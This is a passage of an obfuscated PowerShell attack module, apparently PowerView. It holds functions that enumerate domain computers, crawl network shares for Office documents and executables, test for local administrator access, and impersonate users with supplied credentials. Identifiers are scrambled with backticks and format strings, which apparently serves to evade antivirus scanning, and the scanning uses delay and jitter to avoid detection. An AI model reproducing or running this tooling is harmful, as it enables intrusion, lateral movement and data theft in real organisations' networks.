        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${crE`A`Tio`NtImE},

        [Parameter(PARameTERsetnaMe = "of`FIcEd`O`cs")]
        [Switch]
        ${OfFICE`do`cs},

        [Parameter(pARAMETERSetNaMe = "FRES`hE`xes")]
        [Switch]
        ${f`R`esHexES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}" -f'r','Controlle','Dom','ain'})]
        [String]
        ${SEr`VeR},

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{2}{0}{1}" -f 'e','Level','On'}, {"{1}{0}{2}"-f'btre','Su','e'})]
        [String]
        ${searc`H`sco`pE} = ("{1}{0}" -f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResuL`TPA`gE`S`Ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVe`Rt`i`mELi`MiT},

        [Switch]
        ${TO`mB`sTonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrED`eN`T`IaL} =   (VARIabLe ("{0}{1}" -f'7tQ0','2')  -VAlUeO  )::"emp`Ty",

        [ValidateRange(1, 10000)]
        [Int]
        ${de`LAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jiTt`ER} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${th`ReA`ds} = 20
    )

    BEGIN {
        ${coM`pU`T`e`RsEARCH`ERaR`GUMe`NTs} = @{
            ("{3}{1}{2}{0}"-f'ties','p','er','Pro') = ("{0}{1}{3}{2}" -f'dn','s','me','hostna')
        }
        if (${psbO`Und`para`meTERS}[("{0}{3}{4}{1}{2}"-f 'Com','Domai','n','pu','ter')]) { ${ComPUTErse`A`RCH`e`Rar`GuMeNTS}[("{0}{1}" -f'Do','main')] = ${coMPUT`eRdom`A`iN} }
        if (${pSBoU`NDPARA`MEt`e`RS}[("{0}{1}{2}{3}" -f'Com','put','erL','DAPFilter')]) { ${C`Om`pU`TERse`Ar`cHEra`RGuMe`N`TS}[("{0}{2}{1}"-f 'LD','ilter','APF')] = ${cOM`p`UteR`L`DapF`ilT`eR} }
        if (${PS`BoUND`PARAM`eTE`Rs}[("{1}{0}{3}{2}" -f'ea','ComputerS','chBase','r')]) { ${cOMp`U`TErsEARcHEra`RGU`MENtS}[("{1}{0}{2}" -f 'as','SearchB','e')] = ${COm`putersEA`R`ChBASE} }
        if (${P`Sb`oUndP`A`RaMeteRs}[("{4}{3}{6}{2}{5}{1}{0}" -f 'gSystem','n','O','ute','Comp','perati','r')]) { ${C`O`M`PUTe`RS`EARchE`Ra`RGU`MentS}[("{0}{1}{4}{2}{3}" -f 'O','peratingSy','te','m','s')] = ${OPE`RAT`iNG`sy`sTEm} }
        if (${ps`BoUNDPaRaMe`Te`Rs}[("{1}{4}{0}{3}{2}"-f 'rvic','Compute','k','ePac','rSe')]) { ${Co`mpu`TERsEArCH`eraRgu`M`E`NTs}[("{2}{3}{0}{1}" -f 'eP','ack','S','ervic')] = ${Se`RvI`CEpAck} }
        if (${pSbou`Nd`pARaME`T`ERs}[("{2}{1}{0}{3}" -f'm','rSiteNa','Compute','e')]) { ${c`OMPu`TeR`s`eAR`c`HerAR`G`Uments}[("{2}{0}{1}" -f 'a','me','SiteN')] = ${sI`Ten`AmE} }
        if (${psbOUn`dPA`R`AMetErS}[("{1}{0}{2}"-f'rve','Se','r')]) { ${compu`TE`RsEARCHe`RArGUmEN`Ts}[("{1}{2}{0}" -f'ver','Se','r')] = ${SE`R`VER} }
        if (${pSB`O`UNdP`A`RAmET`ErS}[("{3}{0}{1}{2}"-f'earc','hS','cope','S')]) { ${coMputer`se`A`RCHe`RaR`gum`ENts}[("{1}{0}{2}"-f'hSco','Searc','pe')] = ${se`AR`chsc`opE} }
        if (${Ps`BoU`NDPaR`AME`TE`RS}[("{0}{2}{3}{1}" -f'R','eSize','esu','ltPag')]) { ${cOMPut`e`R`S`eArCh`eraRg`UME`NtS}[("{1}{3}{2}{0}" -f'Size','Res','ge','ultPa')] = ${r`es`ULTpAg`ES`IzE} }
        if (${PSBO`U`NDparamE`TERS}[("{3}{1}{4}{2}{0}" -f 'it','erve','imeLim','S','rT')]) { ${c`o`MpUte`RsEa`RCHerar`g`UmEN`TS}[("{2}{3}{0}{1}" -f'eLimi','t','ServerTi','m')] = ${sErve`Rti`mE`limIT} }
        if (${PSB`O`UNdPA`RAMEtErS}[("{0}{2}{1}" -f'To','ne','mbsto')]) { ${c`OMP`UTeRSeARCHe`RAR`G`UMeNtS}[("{2}{1}{0}"-f 'ne','bsto','Tom')] = ${T`o`MBsTo`Ne} }
        if (${PSbOuN`dP`ARa`mEterS}[("{2}{1}{0}" -f'al','ti','Creden')]) { ${c`oMpUTE`Rse`Arche`RA`RgU`MeNtS}[("{1}{0}{2}"-f 'entia','Cred','l')] = ${CrE`DENT`i`Al} }

        if (${PS`BoU`N`DPa`RaMEte`Rs}[("{0}{2}{1}" -f 'Comp','Name','uter')]) {
            ${TARg`Et`C`OMpUTe`RS} = ${C`omP`UtErNaMe}
        }
        else {
            &("{1}{2}{0}" -f '-Verbose','Wr','ite') ("{7}{12}{2}{6}{9}{8}{5}{11}{3}{0}{1}{4}{15}{14}{13}{10}"-f 'c','omputers ','nS','rying ','in t',' Qu','ha','[Find-Inter','eFile]','r','n','e','estingDomai','i','doma','he ')
            ${TAr`g`eTc`O`mPUterS} = &("{1}{3}{2}{0}"-f 'uter','Get-D','p','omainCom') @ComputerSearcherArguments | &("{1}{0}{2}" -f 'ect','Sel','-Object') -ExpandProperty ("{0}{1}{2}"-f 'dnsh','ost','name')
        }
        &("{1}{0}{2}"-f'bo','Write-Ver','se') "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if (${tArg`ETCoM`pUT`ERS}."leN`g`TH" -eq 0) {
            throw ("{5}{7}{6}{8}{0}{2}{3}{10}{9}{4}{1}{11}"-f 'reFile] ','to en','No h','osts f','d ','[Find-','oma','InterestingD','inSha','n','ou','umerate')
        }

        
        ${HOSten`U`m`BloCK} = {
            Param(${c`OmpU`Te`RNa`me}, ${InCl`U`dE}, ${exC`lud`e`DS`HaRES}, ${oF`FICE`doCS}, ${eX`c`LudEH`idDEN}, ${FrEs`he`XES}, ${chE`cKW`Rit`eaccEss}, ${T`o`KeNHaN`DlE})

            if (${tOK`eNh`ANdLE}) {
                
                ${nu`lL} = &("{4}{3}{5}{0}{1}{2}"-f 'nati','o','n','m','Invoke-UserI','perso') -TokenHandle ${T`oKENHaN`d`le} -Quiet
            }

            ForEach (${T`ArGeT`C`oMPu`Ter} in ${Co`M`pu`TERna`Me}) {

                ${SeA`RC`H`shA`Res} = @()
                if (${T`AR`G`ET`CompuTER}.("{2}{1}{3}{0}" -f'th','artsW','St','i').Invoke('\\')) {
                    
                    ${sEA`R`Ch`SHarEs} += ${taRGeT`coM`PU`T`ER}
                }
                else {
                    ${uP} = &("{2}{3}{1}{0}"-f 'n','o','Test-','Connecti') -Count 1 -Quiet -ComputerName ${Ta`Rge`TCoM`PU`TER}
                    if (${uP}) {
                        
                        ${S`Ha`Res} = &("{1}{2}{0}"-f'hare','Ge','t-NetS') -ComputerName ${tarGEtcO`m`put`er}
                        ForEach (${SHA`Re} in ${SH`A`ReS}) {
                            ${sHAREn`A`mE} = ${Sha`RE}."n`Ame"
                            ${P`Ath} = '\\'+${tA`RgeTcOmpU`T`er}+'\'+${s`HaRE`N`AME}
                            
                            if ((${s`hARe`NAMe}) -and (${Sha`R`EnAme}.("{1}{0}" -f'rim','T').Invoke() -ne '')) {
                                
                                if (${e`xCLUdeD`sH`ARES} -NotContains ${shAR`en`AmE}) {
                                    
                                    try {
                                        ${nu`LL} =   (geT-VariABLe ('re'+'IQ') -VAlueONLY)::("{2}{1}{0}" -f'iles','etF','G').Invoke(${pA`TH})
                                        ${s`E`ArcHs`HAreS} += ${p`ATH}
                                    }
                                    catch {
                                        &("{1}{2}{0}"-f'ose','Write','-Verb') ('[!]'+' '+'N'+'o '+'acc'+'ess '+'to'+' '+"$Path")
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (${s`H`ArE} in ${S`EARCh`shAR`ES}) {
                    &("{3}{0}{1}{2}{4}" -f'it','e-','Ver','Wr','bose') ('S'+'earc'+'hing '+'sha'+'re:'+' '+"$Share")
                    ${seARch`A`R`GS} = @{
                        ("{1}{0}"-f'ath','P') = ${Sh`ArE}
                        ("{2}{0}{1}" -f'nc','lude','I') = ${In`cL`UdE}
                    }
                    if (${O`F`Fi`CeDocS}) {
                        ${searc`h`A`RgS}[("{3}{1}{0}{2}" -f'ceD','fi','ocs','Of')] = ${OF`F`IcE`doCS}
                    }
                    if (${frEsH`E`xES}) {
                        ${s`earCha`R`gS}[("{2}{1}{0}"-f's','hEXE','Fres')] = ${fr`esh`ex`Es}
                    }
                    if (${LasTac`CEsstI`Me}) {
                        ${SeA`Rc`hARGS}[("{0}{1}{3}{2}"-f 'LastAcce','ss','e','Tim')] = ${LASta`C`ceSsT`iME}
                    }
                    if (${L`AStWriT`e`TI`ME}) {
                        ${SeA`RchA`RgS}[("{3}{1}{4}{2}{0}" -f'me','tWri','eTi','Las','t')] = ${l`AstWrIT`Et`i`ME}
                    }
                    if (${crEAtIoN`Ti`mE}) {
                        ${S`e`ARchA`RGs}[("{0}{2}{1}"-f'Creat','nTime','io')] = ${CReA`TiONt`i`mE}
                    }
                    if (${CHecKwriT`eA`c`Ce`ss}) {
                        ${SEa`R`ChA`RGS}[("{4}{5}{2}{0}{3}{1}" -f 'it','Access','ckWr','e','C','he')] = ${chEcK`w`RItEACC`ess}
                    }
                    &("{0}{4}{2}{3}{1}{5}" -f'Find-','ngFi','t','i','Interes','le') @SearchArgs
                }
            }

            if (${t`oK`en`hANDle}) {
                &("{4}{0}{2}{3}{5}{1}" -f'vo','ertToSelf','ke','-','In','Rev')
            }
        }

        ${logONt`oK`EN} = ${n`UlL}
        if (${Ps`BoU`ND`PAr`A`MetERS}[("{2}{0}{1}"-f'reden','tial','C')]) {
            if (${PSBo`UndP`ARam`EtE`RS}[("{1}{0}" -f'elay','D')] -or ${p`SB`Oun`Dpar`A`mETers}[("{0}{2}{3}{4}{1}" -f 'St','uccess','o','pOn','S')]) {
                ${Log`O`Nto`keN} = &("{2}{1}{3}{5}{0}{4}" -f't','nvoke','I','-UserImp','ion','ersona') -Credential ${C`REde`Nti`AL}
            }
            else {
                ${L`ogONTO`kEN} = &("{5}{4}{2}{1}{0}{6}{3}"-f 'rImperson','e','ke-Us','on','o','Inv','ati') -Credential ${CReD`e`NTiAL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${pSbo`U`NDpA`RaMEt`e`Rs}[("{1}{0}" -f'lay','De')] -or ${P`SBOU`NDpaR`AmeTE`RS}[("{2}{0}{1}"-f 'topOnSucce','ss','S')]) {

            &("{3}{1}{0}{2}"-f 'Ver','rite-','bose','W') "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            &("{2}{0}{1}"-f'rit','e-Verbose','W') ('[Find-Inte'+'r'+'es'+'tin'+'gD'+'om'+'ainShar'+'e'+'Fil'+'e'+'] '+'De'+'lay: '+"$Delay, "+'Ji'+'tter'+': '+"$Jitter")
            ${CO`UNt`eR} = 0
            ${ra`N`Dno} = &("{1}{0}{2}" -f'ew-O','N','bject') ("{1}{2}{0}{3}"-f 'n','System.','Ra','dom')

            ForEach (${tAr`Ge`T`ComPUT`er} in ${t`A`Rge`TcomPuTERS}) {
                ${Co`UN`Ter} = ${Cou`NT`ER} + 1

                
                &("{0}{2}{3}{1}" -f'St','p','art-Sl','ee') -Seconds ${RA`ND`NO}.("{0}{1}" -f'N','ext').Invoke((1-${jiT`TeR})*${d`ElAy}, (1+${jIT`TEr})*${d`ElAY})

                &("{0}{2}{1}{3}{4}" -f'W','t','ri','e-Verb','ose') "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{1}{0}{2}" -f'nv','I','oke-Command') -ScriptBlock ${H`O`stenu`mb`LOCk} -ArgumentList ${Tar`gETCo`MPUT`ER}, ${iNC`LU`De}, ${exC`lUDEdSh`AREs}, ${oF`FI`CEDocS}, ${Ex`cLUd`e`HIDD`En}, ${f`RESHe`xes}, ${cH`ecK`wRiTeA`C`CeSS}, ${l`oGON`TO`Ken}
            }
        }
        else {
            &("{2}{1}{0}{3}" -f'r','-Ve','Write','bose') ('[Fi'+'nd'+'-I'+'nteresting'+'DomainSh'+'areFile] '+'Using'+' '+'th'+'rea'+'ding'+' '+'wi'+'th '+'threads:'+' '+"$Threads")

            
            ${scR`iptP`AR`AMS} = @{
                ("{0}{1}{2}" -f'Incl','u','de') = ${in`cLudE}
                ("{1}{0}{2}"-f 'har','ExcludedS','es') = ${eXCL`Ud`eDsh`AREs}
                ("{0}{1}{2}"-f'Of','ficeD','ocs') = ${of`FiCE`d`OCS}
                ("{3}{0}{1}{2}"-f'cl','udeH','idden','Ex') = ${ExCl`U`Deh`iddEN}
                ("{2}{3}{0}{1}"-f'h','EXEs','F','res') = ${f`Res`hE`xES}
                ("{3}{4}{1}{0}{2}"-f 'i','Wr','teAccess','Che','ck') = ${CHe`CkW`Ri`TEac`CEsS}
                ("{1}{2}{0}" -f 'e','Token','Handl') = ${lOg`On`TOkEn}
            }

            
            &("{2}{0}{4}{5}{3}{1}" -f'ew','tion','N','c','-ThreadedFu','n') -ComputerName ${tA`RGE`TC`omPU`TeRs} -ScriptBlock ${H`o`S`TenUMBlOck} -ScriptParameters ${SCrIpt`p`Ar`A`MS} -Threads ${ThR`eADs}
        }
    }

    END {
        if (${LOg`oN`TokEN}) {
            &("{2}{5}{4}{3}{0}{1}" -f 'tToSel','f','I','er','voke-Rev','n') -TokenHandle ${logo`N`ToKeN}
        }
    }
}


function F`inD`-`l`oca`laDmiN`ACCESS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}{4}"-f 'c','e','ouldPro','PSSh','ss'}, '')]
    [OutputType([String])]
    Param(
        [Parameter(PoSITIoN = 0, vALuEfRoMpiPELINe = ${t`RUe}, valueFRomPIPElIneBYpRoPertYNAme = ${T`RUe})]
        [Alias({"{1}{2}{0}" -f'Name','DNSHo','st'})]
        [String[]]
        ${c`oMpU`TErn`AMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`OmPuTE`RdOm`A`iN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COmPuterL`DA`pFi`l`T`ER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`OmPUTe`Rs`eArCHB`A`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}" -f 'ngSyste','ati','Oper','m'})]
        [String]
        ${C`omPuTEro`pErAtiNgs`ysT`em},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}" -f'ervi','S','c','ePack'})]
        [String]
        ${ComP`Ut`eRsErvicEp`ACk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'me','eNa','Sit'})]
        [String]
        ${CO`M`puteRsITE`Na`Me},

        [Switch]
        ${Ch`eCK`sHaRe`Access},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{4}{2}" -f 'on','Domai','oller','nC','tr'})]
        [String]
        ${SeR`VeR},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{2}{1}{0}"-f 'el','ev','OneL'}, {"{2}{1}{0}"-f'ee','tr','Sub'})]
        [String]
        ${SeAR`cHSc`Ope} = ("{1}{0}" -f'ubtree','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RESU`LTpAG`eS`I`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RVER`TimeL`I`MiT},

        [Switch]
        ${tO`MBst`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`ent`iaL} =   (gi  ("V"+"a"+"r"+"iAB"+"LE:7tQ02")  )."V`ALuE"::"eMp`TY",

        [ValidateRange(1, 10000)]
        [Int]
        ${de`LaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jIT`TEr} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${THrEa`ds} = 20
    )

    BEGIN {
        ${COmPu`T`er`sEarCHeRARg`UMe`Nts} = @{
            ("{0}{2}{1}"-f'Pro','erties','p') = ("{1}{0}{2}" -f's','dnsho','tname')
        }
        if (${PsBo`U`N`dpaRameT`ErS}[("{1}{0}{3}{2}" -f 'put','Com','omain','erD')]) { ${ComPU`T`eRs`eArc`HERarGUmeNTS}[("{1}{0}{2}"-f'm','Do','ain')] = ${COM`pU`TEr`domaIN} }
        if (${pSbOUND`Pa`RA`MeTErS}[("{2}{3}{0}{4}{1}"-f 'erLD','r','Co','mput','APFilte')]) { ${C`Om`puTErS`e`ArChE`RA`RG`UM`enTS}[("{2}{3}{0}{1}" -f 'PF','ilter','L','DA')] = ${C`O`m`p`Ute`RldApFilteR} }
        if (${PS`Bo`UnD`PARaMETeRS}[("{0}{2}{4}{1}{3}" -f'Com','earch','pute','Base','rS')]) { ${CO`mpu`TER`S`EARCHER`ArGUm`eNts}[("{2}{3}{0}{1}"-f 'chBas','e','Sea','r')] = ${CoMPuT`ErS`e`ARc`H`BasE} }
        if (${ps`Bo`U`NdpaRAmetERS}[("{2}{0}{3}{1}{4}"-f'o','st','Unc','n','rained')]) { ${Com`pUtE`RsearCHe`RArGU`Ments}[("{0}{1}{3}{2}" -f'U','n','d','constraine')] = ${UnCo`NS`TR`A`inED} }
        if (${p`s`BoUNDP`A`RameTE`RS}[("{3}{0}{6}{4}{2}{1}{5}"-f 'm','pera','rO','Co','te','tingSystem','pu')]) { ${cOMp`U`TERs`EaRcHER`ArgumenTS}[("{3}{1}{2}{0}" -f'ingSystem','era','t','Op')] = ${OPER`A`TIN`GsYST`EM} }
        if (${PSbou`NdpaRAm`Et`eRS}[("{0}{2}{3}{1}"-f 'C','Pack','omputerServic','e')]) { ${C`Om`pUt`E`R`sEA`RChEraRguM`EntS}[("{0}{3}{2}{1}" -f'S','cePack','i','erv')] = ${Se`RvICEP`Ack} }
        if (${psBOunDParA`M`et`erS}[("{4}{0}{1}{2}{3}"-f 'o','mp','uterSiteNa','me','C')]) { ${cOmP`Ute`R`SEArCHe`R`ARG`UmE`NTS}[("{2}{1}{0}"-f 'Name','e','Sit')] = ${sit`E`NaME} }
        if (${PsbOunDP`AR`Am`EterS}[("{2}{1}{0}"-f'er','v','Ser')]) { ${CompUTEr`SEaR`c`Her`AR`gUMen`TS}[("{0}{1}{2}" -f 'Serv','e','r')] = ${Serv`eR} }
        if (${PSb`o`UndparA`mETErs}[("{2}{0}{1}"-f'archSco','pe','Se')]) { ${coM`Pute`RS`e`Ar`CH`erArgUMEnTs}[("{2}{1}{0}{3}" -f'hSco','arc','Se','pe')] = ${sE`AR`cHScOpe} }
        if (${pS`BOund`P`ArAmetErs}[("{2}{0}{3}{1}"-f'g','e','ResultPa','eSiz')]) { ${cO`m`pUT`erseaRcHEr`ARguMEnts}[("{2}{4}{0}{1}{3}"-f 'lt','PageSi','Res','ze','u')] = ${ReS`UL`TPa`GEsIzE} }
        if (${pSBOunDpaRA`meT`E`Rs}[("{1}{0}{2}"-f'erverTime','S','Limit')]) { ${Co`MPuT`e`RS`e`A`R`cHERArGumE`NTS}[("{0}{1}{2}" -f'ServerT','imeL','imit')] = ${sErVe`RTiMel`IM`it} }
        if (${pS`BOU`NdP`ArAm`eTE`RS}[("{2}{0}{1}" -f'sto','ne','Tomb')]) { ${coMp`U`T`e`RsEaRCH`ERa`RGUMEn`TS}[("{1}{2}{0}"-f 'e','Tombsto','n')] = ${tOMbS`TO`Ne} }
        if (${pSbo`UNDpA`R`AMet`eRS}[("{2}{0}{1}"-f'ntia','l','Crede')]) { ${c`OMP`UteR`sEa`R`Chera`RGu`MEnts}[("{2}{0}{3}{1}"-f'n','l','Crede','tia')] = ${crEd`e`NtIaL} }

        if (${P`s`BOUNdpA`RaMETeRS}[("{3}{1}{0}{2}"-f 'mputerNam','o','e','C')]) {
            ${Ta`RgETCOm`pU`TeRS} = ${cO`MpU`Tern`AmE}
        }
        else {
            &("{3}{2}{1}{0}"-f 'se','bo','ite-Ver','Wr') ("{14}{5}{11}{4}{2}{1}{7}{6}{0}{9}{12}{10}{15}{3}{8}{13}"-f'er','nAcc','i','he ','alAdm','Find-Lo',' Qu','ess]','d','y','in','c','ing computers ','omain','[',' t')
            ${TARg`ETC`omPU`TerS} = &("{1}{3}{0}{2}" -f 'mpute','Get-','r','DomainCo') @ComputerSearcherArguments | &("{2}{0}{1}"-f'e','lect-Object','S') -ExpandProperty ("{1}{3}{0}{2}"-f 'a','dns','me','hostn')
        }
        &("{1}{2}{0}" -f'bose','Writ','e-Ver') "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if (${t`ARge`Tc`Om`PUTeRs}."leN`G`Th" -eq 0) {
            throw ("{11}{8}{3}{1}{6}{2}{0}{9}{10}{4}{7}{5}"-f 's] ','dminAc','s','d-LocalA','ts found to','te','ce',' enumera','in','No ho','s','[F')
        }

        
        ${hOStEn`UM`B`lock} = {
            Param(${cOM`p`UT`ER`Name}, ${TOken`h`An`DLe})

            if (${TokeNHA`N`Dle}) {
                
                ${Nu`ll} = &("{2}{5}{4}{3}{1}{0}{6}{7}" -f'rs','pe','In','serIm','ke-U','vo','onatio','n') -TokenHandle ${tOke`NH`AnDle} -Quiet
            }

            ForEach (${Targ`e`T`COmPU`TER} in ${CoMp`U`T`eR`NaME}) {
                ${up} = &("{2}{1}{0}"-f 'nnection','Co','Test-') -Count 1 -Quiet -ComputerName ${taRgetc`OMP`U`TEr}
                if (${U`P}) {
                    
                    ${ACC`E`Ss} = &("{0}{2}{3}{1}" -f 'T','s','es','t-AdminAcces') -ComputerName ${T`ARgETcO`MPU`T`Er}
                    if (${ac`C`ess}."iS`ADMiN") {
                        ${T`A`RGETCO`mpuTeR}
                    }
                }
            }

            if (${To`K`EnHa`NDLE}) {
                &("{3}{5}{4}{1}{0}{2}" -f'ToSel','t','f','I','er','nvoke-Rev')
            }
        }

        ${lOg`OnToK`en} = ${N`ULL}
        if (${p`s`B`ounD`ParAmETERS}[("{0}{2}{1}" -f 'Crede','tial','n')]) {
            if (${P`s`BOUND`p`AraMETe`Rs}[("{1}{0}" -f'ay','Del')] -or ${PSbO`UNDParAm`Et`ErS}[("{1}{3}{2}{0}" -f'ss','Sto','ucce','pOnS')]) {
                ${lOGonT`o`K`EN} = &("{6}{2}{3}{0}{1}{5}{4}"-f'e-Us','erImperso','n','vok','tion','na','I') -Credential ${c`REd`EntIAL}
            }
            else {
                ${lOgo`NT`OKEN} = &("{3}{6}{0}{2}{5}{1}{4}"-f 'ke','mpersonati','-User','In','on','I','vo') -Credential ${CR`E`D`enTiAL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${p`sBOundP`AraME`T`ERS}[("{0}{1}" -f'Dela','y')] -or ${p`S`BoUN`dpAr`AMeTe`Rs}[("{2}{3}{0}{1}"-f'es','s','Sto','pOnSucc')]) {

            &("{1}{2}{0}{3}"-f'-Ve','Wr','ite','rbose') "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            &("{2}{1}{0}{3}"-f 'b','rite-Ver','W','ose') ('[F'+'ind-Lo'+'c'+'al'+'Adm'+'inA'+'ccess] '+'Delay'+': '+"$Delay, "+'Ji'+'tter:'+' '+"$Jitter")
            ${CoUnT`ER} = 0
            ${r`AnD`NO} = &("{1}{2}{0}" -f '-Object','N','ew') ("{4}{3}{0}{1}{2}" -f 't','e','m.Random','ys','S')

            ForEach (${T`A`RgETcoM`PuTER} in ${taRg`ETCo`mPUTE`RS}) {
                ${COunt`Er} = ${cO`Unt`eR} + 1

                
                &("{2}{1}{0}"-f'Sleep','rt-','Sta') -Seconds ${raN`dno}.("{0}{1}"-f 'Ne','xt').Invoke((1-${JITT`Er})*${dE`LAY}, (1+${JIt`T`eR})*${D`eL`AY})

                &("{2}{3}{0}{4}{1}" -f 'te-Verb','se','Wr','i','o') "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{0}{2}{3}{1}" -f'In','mmand','voke','-Co') -ScriptBlock ${HO`steNuMB`lock} -ArgumentList ${tar`geTcoMP`UTEr}, ${lO`Go`NTo`kEN}
            }
        }
        else {
            &("{0}{2}{3}{1}" -f 'W','bose','rite','-Ver') ('['+'Find-Loc'+'alA'+'dminAcc'+'e'+'ss] '+'Usi'+'ng '+'thr'+'eadi'+'ng '+'wit'+'h '+'t'+'h'+'reads: '+"$Threads")

            
            ${S`c`RipT`PaRAMS} = @{
                ("{0}{1}{2}"-f 'TokenHa','ndl','e') = ${lOGo`Nt`oK`en}
            }

            
            &("{1}{0}{3}{2}" -f'u','New-ThreadedF','ion','nct') -ComputerName ${t`Ar`GE`Tco`mpuTErS} -ScriptBlock ${HosTenU`mbL`ocK} -ScriptParameters ${scRiP`TPA`RA`ms} -Threads ${ThR`ea`Ds}
        }
    }
}


function F`Ind-DO`MAinL`oC`ALgRO`UpMEMbeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{2}{1}{0}"-f 's','roces','dP','PS','Shoul'}, '')]
    [OutputType({"{0}{6}{5}{2}{4}{7}{1}{8}{3}" -f'PowerVi','r.','lGr','PI','o','a','ew.Loc','upMembe','A'})]
    [OutputType({"{3}{2}{4}{1}{5}{0}"-f 'T','upM','.','PowerView','LocalGro','ember.WinN'})]
    Param(
        [Parameter(posiTIoN = 0, ValUEfrOMpIpEline = ${TR`UE}, VALuEfRoMPiPELIneBYPrOpeRtYNaMe = ${Tr`UE})]
        [Alias({"{1}{2}{0}" -f 'e','DNSHostN','am'})]
        [String[]]
        ${co`mpU`TErN`Ame},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`oMp`UtErdOM`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOmPut`erLd`Ap`Fil`TeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coMpUteRs`E`ARCh`Base},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f'stem','Operat','ingSy'})]
        [String]
        ${COMPUT`eROPERA`TI`Ng`SyStEm},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f 'Pac','k','Service'})]
        [String]
        ${CO`MpUt`E`RSERvIceP`A`ck},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'Si','teNam','e'})]
        [String]
        ${Co`m`PUTe`RSITENAMe},

        [Parameter(vAlueFROmpIPeLINEbYprOPErtYNAME = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${G`RO`UpN`AMe} = ("{0}{1}{2}{3}"-f'A','dmini','st','rators'),

        [ValidateSet('API', {"{0}{1}" -f 'WinN','T'})]
        [Alias({"{2}{1}{4}{0}{3}" -f'ctionMe','ol','C','thod','le'})]
        [String]
        ${mE`ThOd} = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}"-f'ller','Do','mainCon','tro'})]
        [String]
        ${Ser`VER},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{0}{1}" -f 'OneLev','el'}, {"{1}{0}{2}"-f'bt','Su','ree'})]
        [String]
        ${SE`ARch`S`cOPE} = ("{0}{1}"-f 'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESULTP`AG`eSi`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`Rv`ErTI`M`elimit},

        [Switch]
        ${tO`MBs`TOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REd`eNTIal} =  ${7t`Q02}::"E`MPTy",

        [ValidateRange(1, 10000)]
        [Int]
        ${DEL`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`i`TtER} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${thr`eaDS} = 20
    )

    BEGIN {
        ${COM`pu`Ter`SeA`RCHErA`Rgu`mE`NTs} = @{
            ("{2}{1}{0}"-f 's','ie','Propert') = ("{0}{2}{1}"-f 'dns','stname','ho')
        }
        if (${ps`BOUNdP`AR`AmetERs}[("{0}{1}{2}{3}{4}" -f'Com','p','uterD','omai','n')]) { ${Co`M`pu`TeR`Sea`RC`hERARgUMEn`TS}[("{0}{1}" -f'Dom','ain')] = ${C`OmpuT`eRdO`MaIN} }
        if (${p`sBounDPaR`Amet`e`Rs}[("{0}{3}{2}{4}{1}" -f'Comp','APFilter','te','u','rLD')]) { ${cOmpU`TeR`SEaR`cHe`RAR`gUMeNtS}[("{0}{1}{3}{2}"-f'L','DA','Filter','P')] = ${cOMp`U`TEr`LdApfilTER} }
        if (${P`SBOundp`A`RaMet`ERS}[("{4}{3}{1}{2}{0}{5}"-f'Bas','terSearc','h','pu','Com','e')]) { ${CoMpUte`RSeaR`CH`eR`A`RGuMenTS}[("{1}{2}{0}"-f'e','Search','Bas')] = ${C`OMpUte`RSeARChbA`SE} }
        if (${pS`BOU`NDpARAME`TE`Rs}[("{0}{2}{1}"-f 'U','d','nconstraine')]) { ${cOMpUtER`Sea`Rc`h`eRaRgUME`NTs}[("{2}{0}{1}{3}"-f 'nconstrai','n','U','ed')] = ${uncon`stR`Ain`ed} }
